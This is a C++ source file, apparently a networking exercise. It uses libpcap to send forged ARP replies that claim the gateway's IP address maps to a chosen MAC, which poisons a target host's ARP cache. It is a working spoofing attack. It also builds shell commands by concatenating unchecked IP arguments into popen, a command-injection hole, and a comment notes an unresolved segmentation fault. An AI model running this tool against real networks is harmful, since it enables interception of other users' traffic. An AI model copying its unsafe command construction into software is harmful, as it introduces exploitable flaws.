#include <cstdio>
#include <pcap.h>

#include <stdlib.h>
#include <string.h>

#include "ethhdr.h"
#include "arphdr.h"

#define MAX_STR_SIZE 1024

#pragma pack(push, 1)
struct EthArpPacket final {
    EthHdr eth_;
    ArpHdr arp_;
};
#pragma pack(pop)

void usage() {
    printf("syntax: SendArp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
    printf("sample: SendArp eth0 192.168.0.2 192.168.0.3\n");
}

const char* getMACAddr(char *IP)
{

    printf("getMACAddr\n");

    FILE *fp = NULL;

    int len = strlen(IP);
    char* cmd = "ping -c 1 \0";

    char command[MAX_STR_SIZE];

    strcpy(command,cmd);
    strcat(command,IP);


    if((fp=popen(command,"r"))==NULL)
    {
        fprintf(stderr,"Failed to open cmd");
        pclose(fp);
        exit(1);
    }

    pclose(fp);

    printf("First pclose\n");

    if((fp=popen("arp -an","r"))==NULL)
    {
        fprintf(stderr,"Failed to open cmd");
        pclose(fp);
        exit(1);
    }

    char line[MAX_STR_SIZE];
    char* ptr;

    while(fgets(line,MAX_STR_SIZE,fp)!=NULL)
    {
        printf("%s\n",line);
        ptr = strtok(line," ");
        while(ptr!=NULL)
        {
            ptr = strtok(NULL," ");

            printf("%s\n",ptr);

            if(!strncmp((ptr+1),IP,len))
            {
                printf("IF : %s\n",ptr);
                pclose(fp);
                return ptr;
            }
        }
        printf("while out\n");
    }

    fprintf(stderr,"We couldn't find Gateway!");
    exit(1);

}

const char* getGatewayAddr()
{
    printf("getGatewayAddr\n");

   FILE *fp = NULL;
   char line[MAX_STR_SIZE];
   char* ptr;

   if((fp=popen("route","r"))==NULL)
   {
       fprintf(stderr,"Failed to open cmd");
       exit(1);
   }
   while(fgets(line,MAX_STR_SIZE,fp)!=NULL)
   {
       ptr = strtok(line," ");
       if(!strcmp(ptr,"default"))
       {
           ptr=strtok(NULL," ");
           pclose(fp);
           return ptr;
       }
   }

   fprintf(stderr,"We couldn't find Gateway!");
   exit(1);
}

void sendARP(char* dev, char* sender_IP, char* target_IP)
{

    printf("packet_lookup\n");

    printf("%s %s %s\n",dev ,sender_IP, target_IP);

    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, 0, 0, 0, errbuf);
    if (handle == nullptr) {
        fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
        exit(1);
    }

    EthArpPacket packet;
    const char* target_MAC = getMACAddr(target_IP);
    const char* sender_MAC = getMACAddr(sender_IP);

    packet.eth_.dmac_ = Mac(target_MAC);   // you
    packet.eth_.smac_ = Mac(sender_MAC);   // me
    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;
    packet.arp_.op_ = htons(ArpHdr::Reply);
    packet.arp_.smac_ = Mac(sender_MAC);   //me
    packet.arp_.sip_ = htonl(Ip(getGatewayAddr()));        //gate
    packet.arp_.tmac_ = Mac(target_MAC);   //you
    packet.arp_.tip_ = htonl(Ip(target_IP));        //you

    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));

    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
    }

    pcap_close(handle);
}

int main(int argc, char* argv[]) {

    int i;
    int attackCase = 0;

    if (argc < 4 || argc%2!=0)
    {
        usage();
        return -1;
    }

    attackCase = (argc-2)/2;
    //printf("%d",attackCase);

    for (i=0;i<attackCase;i++)
    {
        //printf("%d %s %s %s",i ,argv[1] ,argv[2+i] ,argv[3+i]);
        sendARP(argv[1],argv[2+i],argv[3+i]);     //segement fault
    }


}

